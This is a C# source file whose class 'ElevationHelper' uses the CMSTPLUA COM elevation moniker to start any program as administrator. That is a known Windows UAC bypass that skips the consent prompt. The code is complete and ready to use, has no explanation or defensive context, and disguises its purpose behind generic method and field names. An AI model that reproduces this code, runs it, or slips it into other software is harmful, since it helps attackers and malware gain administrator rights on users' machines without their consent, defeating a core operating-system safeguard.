using System;
using System.Runtime.InteropServices;

[ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IElevationComInterface
{
    void MethodA();
    void MethodB();
    void MethodC();
    void MethodD();
    void MethodE();
    void MethodF();
    void StartProcess(string applicationName, string arguments, string workingDirectory, uint reserved, int windowStyle);
    void MethodH();
    void MethodI();
    void MethodJ();
}

public class ElevationHelper
{
    [DllImport("ole32.dll", CharSet = CharSet.Unicode)]
    static extern int CoGetObject(
        string name,
        ref BindOptions bindOptions,
        ref Guid interfaceId,
        out IElevationComInterface elevationInterface);

    struct BindOptions
    {
        public int structSize;
        public int unknown1;
        public int unknown2;
        public int unknown3;
        public int unknown4;
        public int windowHandleOption;
        public int unknown5;
        public IntPtr unknownPtr1;
        public IntPtr unknownPtr2;
    }

    public static void RunElevated(string executablePath, string arguments, int windowStyle)
    {
        var bindOptions = new BindOptions
        {
            structSize = 0x30,
            windowHandleOption = 4
        };

        var elevationInterfaceId = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");

        IElevationComInterface elevationInterface;
        CoGetObject(
            "Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
            ref bindOptions,
            ref elevationInterfaceId,
            out elevationInterface);

        elevationInterface.StartProcess(
            executablePath,
            arguments,
            "C:\\Windows\\System32",
            0,
            windowStyle);
    }
}
